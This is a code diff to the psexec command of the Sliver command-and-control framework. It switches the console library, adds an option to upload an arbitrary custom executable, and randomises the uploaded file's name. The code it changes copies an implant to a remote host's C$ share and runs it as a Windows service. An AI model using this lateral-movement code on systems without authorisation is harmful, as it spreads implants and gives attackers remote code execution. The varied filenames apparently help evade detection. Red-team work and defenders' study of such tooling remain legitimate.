@@ -22,6 +22,7 @@ import (
 	"context"
 	"fmt"
 	insecureRand "math/rand"
+	"os"
 	"strings"
 	"time"
 
@@ -32,26 +33,28 @@ import (
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/util/encoders"
-	"github.com/desertbit/grumble"
+	"github.com/spf13/cobra"
 )
 
 // PsExecCmd - psexec command implementation.
-func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
+func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
 
-	hostname := ctx.Args.String("hostname")
+	hostname := args[0]
 	if hostname == "" {
 		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
 		return
 	}
-	profile := ctx.Flags.String("profile")
-	serviceName := ctx.Flags.String("service-name")
-	serviceDesc := ctx.Flags.String("service-description")
-	binPath := ctx.Flags.String("binpath")
-	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))
+	var serviceBinary []byte
+	profile, _ := cmd.Flags().GetString("profile")
+	serviceName, _ := cmd.Flags().GetString("service-name")
+	serviceDesc, _ := cmd.Flags().GetString("service-description")
+	binPath, _ := cmd.Flags().GetString("binpath")
+	customExe, _ := cmd.Flags().GetString("custom-exe")
+	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
 		con.PrintWarnf("You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
@@ -61,35 +64,46 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		}
 	}
 
-	if profile == "" {
-		con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
-		return
+	if customExe == "" {
+		if profile == "" {
+			con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
+			return
+		}
+
+		// generate sliver
+		generateCtrl := make(chan bool)
+		con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
+		profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
+		if err != nil {
+			con.PrintErrorf("Error: %s\n", err)
+			return
+		}
+		generateCtrl <- true
+		<-generateCtrl
+		var implantProfile *clientpb.ImplantProfile
+		for _, prof := range profiles.Profiles {
+			if prof.Name == profile {
+				implantProfile = prof
+			}
+		}
+		if implantProfile.GetName() == "" {
+			con.PrintErrorf("No profile found for name %s\n", profile)
+			return
+		}
+		serviceBinary, _ = generate.GetSliverBinary(implantProfile, con)
+	} else {
+		// use a custom exe instead of generating a new Sliver
+		fileBytes, err := os.ReadFile(customExe)
+		if err != nil {
+			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
+			return
+		}
+		serviceBinary = fileBytes
 	}
 
-	// generate sliver
-	generateCtrl := make(chan bool)
-	con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
-	profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
-	if err != nil {
-		con.PrintErrorf("Error: %s\n", err)
-		return
-	}
-	generateCtrl <- true
-	<-generateCtrl
-	var implantProfile *clientpb.ImplantProfile
-	for _, prof := range profiles.Profiles {
-		if prof.Name == profile {
-			implantProfile = prof
-		}
-	}
-	if implantProfile.GetName() == "" {
-		con.PrintErrorf("No profile found for name %s\n", profile)
-		return
-	}
-	sliverBinary, err := generate.GetSliverBinary(implantProfile, con)
-	filename := randomString(10)
+	filename := randomFileName()
 	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
-	uploadGzip := new(encoders.Gzip).Encode(sliverBinary)
+	uploadGzip, _ := new(encoders.Gzip).Encode(serviceBinary)
 	// upload to remote target
 	uploadCtrl := make(chan bool)
 	con.SpinUntil("Uploading service binary ...", uploadCtrl)
@@ -97,7 +111,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    filePath,
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	uploadCtrl <- true
 	<-uploadCtrl
@@ -120,7 +134,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
 		BinPath:            binaryPath,
 		Hostname:           hostname,
-		Request:            con.ActiveTarget.Request(ctx),
+		Request:            con.ActiveTarget.Request(cmd),
 		ServiceDescription: serviceDesc,
 		ServiceName:        serviceName,
 		Arguments:          "",
@@ -143,7 +157,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 			Hostname:    hostname,
 			ServiceName: serviceName,
 		},
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	removeChan <- true
 	<-removeChan
@@ -158,11 +172,37 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	con.PrintInfof("Successfully removed service %s on %s\n", serviceName, hostname)
 }
 
-func randomString(length int) string {
-	var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, length)
-	for i := range b {
-		b[i] = charset[insecureRand.Intn(len(charset))]
+func randomString() string {
+	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
+	str := ""
+	for index := 0; index < insecureRand.Intn(8)+1; index++ {
+		str += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
 	}
-	return string(b)
+	return str
+}
+
+func randomFileName() string {
+	noun := randomString()
+	noun = strings.ToLower(noun)
+	switch insecureRand.Intn(3) {
+	case 0:
+		noun = strings.ToUpper(noun)
+	case 1:
+		noun = strings.ToTitle(noun)
+	}
+
+	separators := []string{"", "", "", "", "", ".", "-", "_", "--", "__"}
+	sep := separators[insecureRand.Intn(len(separators))]
+
+	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
+	prefix := ""
+	for index := 0; index < insecureRand.Intn(3); index++ {
+		prefix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
+	}
+	suffix := ""
+	for index := 0; index < insecureRand.Intn(6)+1; index++ {
+		suffix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
+	}
+
+	return fmt.Sprintf("%s%s%s%s%s", prefix, sep, noun, sep, suffix)
 }
